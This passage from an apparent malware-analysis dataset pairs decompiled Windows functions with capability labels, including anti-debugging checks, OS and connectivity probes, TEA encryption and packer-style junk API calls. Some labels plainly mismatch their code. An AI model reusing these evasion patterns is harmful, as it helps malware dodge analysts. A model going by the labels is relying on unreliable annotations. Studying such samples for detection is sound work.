arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040e3fe:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x81dc44 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x81dc44 < iVar12) {\n                if (iVar12 < *0x81dc40) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x81dc40;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040e7b5;\n            }\n            var_10h = *0x81dc44 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040e5a1;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040e5a1:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040e7b5:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3686
    },
    "0040e7f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e7f8(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040ecf9;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x81dc60 - 1;\n        iVar4 = *0x81dc60 + (*0x81dc60 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x81dc60 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040e92d;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040e934;\ncode_r0x0040e92d:\n                        do {\n                            var_4h = 1;\ncode_r0x0040e934:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040e942;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040e942:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x81dc5c - *0x81dc60) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x81dc5c < iVar12) {\n                if (iVar12 < *0x81dc58) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x81dc6c;\n                    iVar4 = *0x81dc64 + (*0x81dc64 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x81dc64 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x81dc64 + (*0x81dc64 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x81dc64 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x81dc6c + *0x81dc58;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040ecf9;\n            }\n            var_10h = *0x81dc5c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x81dc60 - 1;\n            iVar12 = *0x81dc60 + (*0x81dc60 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x81dc60 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040eae5;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040eae5:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x81dc64 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ecf9:\n    var_20h = iVar12 << (0x1fU - *0x81dc64 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x81dc68 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x81dc68 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3652
    },
    "0040ed3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040effe)\n// WARNING: Removing unreachable block (ram,0x0040efc7)\n// WARNING: Removing unreachable block (ram,0x0040f3af)\n// WARNING: Removing unreachable block (ram,0x0040efd6)\n// WARNING: Removing unreachable block (ram,0x0040efde)\n// WARNING: Removing unreachable block (ram,0x0040efe4)\n// WARNING: Removing unreachable block (ram,0x0040efe7)\n// WARNING: Removing unreachable block (ram,0x0040efee)\n// WARNING: Removing unreachable block (ram,0x0040eff8)\n// WARNING: Removing unreachable block (ram,0x0040f053)\n// WARNING: Removing unreachable block (ram,0x0040f04d)\n// WARNING: Removing unreachable block (ram,0x0040f059)\n// WARNING: Removing unreachable block (ram,0x0040f076)\n// WARNING: Removing unreachable block (ram,0x0040f078)\n// WARNING: Removing unreachable block (ram,0x0040f080)\n// WARNING: Removing unreachable block (ram,0x0040f083)\n// WARNING: Removing unreachable block (ram,0x0040f088)\n// WARNING: Removing unreachable block (ram,0x0040f08b)\n// WARNING: Removing unreachable block (ram,0x0040f3b8)\n// WARNING: Removing unreachable block (ram,0x0040f096)\n// WARNING: Removing unreachable block (ram,0x0040f3cf)\n// WARNING: Removing unreachable block (ram,0x0040f3d6)\n// WARNING: Removing unreachable block (ram,0x0040f0a1)\n// WARNING: Removing unreachable block (ram,0x0040f0b4)\n// WARNING: Removing unreachable block (ram,0x0040f0b6)\n// WARNING: Removing unreachable block (ram,0x0040f0c3)\n// WARNING: Removing unreachable block (ram,0x0040f0c8)\n// WARNING: Removing unreachable block (ram,0x0040f0ce)\n// WARNING: Removing unreachable block (ram,0x0040f0d7)\n// WARNING: Removing unreachable block (ram,0x0040f0de)\n// WARNING: Removing unreachable block (ram,0x0040f0f6)\n// WARNING: Removing unreachable block (ram,0x0040f107)\n// WARNING: Removing unreachable block (ram,0x0040f115)\n// WARNING: Removing unreachable block (ram,0x0040f154)\n// WARNING: Removing unreachable block (ram,0x0040f15d)\n// WARNING: Removing unreachable block (ram,0x0040f375)\n// WARNING: Removing unreachable block (ram,0x0040f16b)\n// WARNING: Removing unreachable block (ram,0x0040f175)\n// WARNING: Removing unreachable block (ram,0x0040f390)\n// WARNING: Removing unreachable block (ram,0x0040f182)\n// WARNING: Removing unreachable block (ram,0x0040f189)\n// WARNING: Removing unreachable block (ram,0x0040f193)\n// WARNING: Removing unreachable block (ram,0x0040f198)\n// WARNING: Removing unreachable block (ram,0x0040f1a8)\n// WARNING: Removing unreachable block (ram,0x0040f1ad)\n// WARNING: Removing unreachable block (ram,0x0040f1b7)\n// WARNING: Removing unreachable block (ram,0x0040f1bc)\n// WARNING: Removing unreachable block (ram,0x0040f1ce)\n// WARNING: Removing unreachable block (ram,0x0040f1db)\n// WARNING: Removing unreachable block (ram,0x0040f1ea)\n// WARNING: Removing unreachable block (ram,0x0040f1f7)\n// WARNING: Removing unreachable block (ram,0x0040f214)\n// WARNING: Removing unreachable block (ram,0x0040f218)\n// WARNING: Removing unreachable block (ram,0x0040f21f)\n// WARNING: Removing unreachable block (ram,0x0040f228)\n// WARNING: Removing unreachable block (ram,0x0040f22b)\n// WARNING: Removing unreachable block (ram,0x0040f23c)\n// WARNING: Removing unreachable block (ram,0x0040f24a)\n// WARNING: Removing unreachable block (ram,0x0040f255)\n// WARNING: Removing unreachable block (ram,0x0040f25c)\n// WARNING: Removing unreachable block (ram,0x0040f287)\n// WARNING: Removing unreachable block (ram,0x0040f28c)\n// WARNING: Removing unreachable block (ram,0x0040f297)\n// WARNING: Removing unreachable block (ram,0x0040f2a0)\n// WARNING: Removing unreachable block (ram,0x0040f2a6)\n// WARNING: Removing unreachable block (ram,0x0040f2a9)\n// WARNING: Removing unreachable block (ram,0x0040f2cf)\n// WARNING: Removing unreachable block (ram,0x0040f2d4)\n// WARNING: Removing unreachable block (ram,0x0040f2d9)\n// WARNING: Removing unreachable block (ram,0x0040f2e6)\n// WARNING: Removing unreachable block (ram,0x0040f2f7)\n// WARNING: Removing unreachable block (ram,0x0040f328)\n// WARNING: Removing unreachable block (ram,0x0040f2fd)\n// WARNING: Removing unreachable block (ram,0x0040f323)\n// WARNING: Removing unreachable block (ram,0x0040f307)\n// WARNING: Removing unreachable block (ram,0x0040f31d)\n// WARNING: Removing unreachable block (ram,0x0040f316)\n// WARNING: Removing unreachable block (ram,0x0040f32b)\n// WARNING: Removing unreachable block (ram,0x0040f358)\n// WARNING: Removing unreachable block (ram,0x0040f335)\n// WARNING: Removing unreachable block (ram,0x0040f1c0)\n// WARNING: Removing unreachable block (ram,0x0040f19d)\n// WARNING: Removing unreachable block (ram,0x0040f393)\n// WARNING: Removing unreachable block (ram,0x0040f0d9)\n// WARNING: Removing unreachable block (ram,0x0040f39d)\n// WARNING: Removing unreachable block (ram,0x0040f3de)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040ed3c(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00409b33();\n        *puVar2 = 0x16;\n        fcn.00409acb(0, 0, 0, 0, 0);\n        fcn.004082e0(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040edcf. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40f404\n    (**0x40f404)();\n    return;\n}\n",
        "token_count": 1896
    },
    "00406138": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406138(uint param_1, int32_t param_2)\n\n{\n    in(param_2 + 1);\n    return *(param_2 + 5);\n}\n",
        "token_count": 43
    },
    "00410f63": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00410f63(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408a10(0x411e00, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00409b46();\n        *puVar2 = 0;\n        puVar2 = fcn.00409b33();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x2f654e0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x2f65500;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00410769(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00409b33();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00409b46();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00410830(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00411035(0x411e00);\n                goto code_r0x0041102f;\n            }\n        }\n        puVar2 = fcn.00409b46();\n        *puVar2 = 0;\n        puVar2 = fcn.00409b33();\n        *puVar2 = 9;\n        fcn.00409acb(0, 0, 0, 0, 0);\n    }\ncode_r0x0041102f:\n    fcn.00408a55();\n    return;\n}\n",
        "token_count": 631
    },
    "00404110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404110(int32_t *param_1)\n\n{\n    *param_1 = *param_1 + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 43
    },
    "00404120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404120(int32_t *param_1, int32_t param_2)\n\n{\n    *param_1 = *param_1 + param_2;\n    return;\n}\n",
        "token_count": 45
    },
    "00404140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "contain loop",
            "encrypt data using TEA"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404140(uint *param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar1 = *param_1;\n    fcn.00404110();\n    iVar3 = 0x20;\n    do {\n        if (*0x2f5da9c == 0xc) {\n            (*_sym.imp.KERNEL32.dll_SearchPathA)(0, 0, 0, 0, 0, 0);\n        }\n        if (*0x2f5da9c == 0xfa9) {\n            *0x2f5da98 = 0xedeb2e40;\n        }\n        else if (*0x2f5da9c == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_GetSystemTimeAdjustment)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CommConfigDialogW)(0, 0, 0);\n            *0x2f5a58c = 0;\n        }\n        *0x2f5da94 = 0xf4ea3dee;\n        if (*0x2f5da9c == 0xc) {\n            (*_sym.imp.KERNEL32.dll_WaitNamedPipeA)(0x40126c, 0);\n            (*_sym.imp.KERNEL32.dll_OpenWaitableTimerW)(0, 0, 0);\n        }\n        fcn.00404120();\n        *0x81e650 = 0;\n        fcn.00404130();\n        uVar2 = fcn.00404100();\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *param_1 = uVar1;\n    param_1[1] = uVar2;\n    return;\n}\n",
        "token_count": 404
    },
    "00404400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
